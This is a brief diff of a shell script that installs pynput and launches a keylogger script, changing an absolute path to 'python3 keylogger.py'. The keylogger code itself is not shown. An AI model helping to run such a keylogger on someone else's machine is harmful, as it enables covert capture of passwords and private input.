@@ -27,7 +27,7 @@ pip3 install pynput
 
 # Run the keylogger script
 echo "Running the script..."
-python /Users/admin/Documents/keylogger/keylogger.py
+python3 keylogger.py
 
 # Deactivate the virtual environment
 deactivate
